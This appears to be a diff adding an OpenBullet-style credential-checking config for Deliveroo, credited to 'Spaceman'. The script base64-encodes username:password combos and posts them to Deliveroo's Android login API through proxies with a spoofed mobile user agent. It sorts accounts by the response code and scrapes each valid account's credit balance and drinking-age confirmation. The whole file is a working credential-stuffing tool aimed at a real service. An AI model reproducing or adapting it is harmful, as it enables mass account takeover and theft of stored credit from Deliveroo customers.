@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Deliveroo",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:25:32.6984264+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "Combo" 
+REQUEST POST "https://deliveroo.co.uk/orderapp/v1/login?track=1" 
+  CONTENT "{\"client_type\":\"orderapp_android\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Deliveroo/2.60.0 (samsung SM-G955N;Android 5.1.1;en-UK;releaseEnv release)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Roo-Country: uk" 
+  HEADER "Authorization: Basic <Combo>" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "active_credits\":" 
+PARSE "<SOURCE>" LR "active_credits\":" ",\"roovite" -> CAP "Credits : " "£" "" 
+PARSE "<SOURCE>" LR "did_confirm_drinking_age\":" ",\"marketing" -> CAP "Drinking Age Confirmed : " 
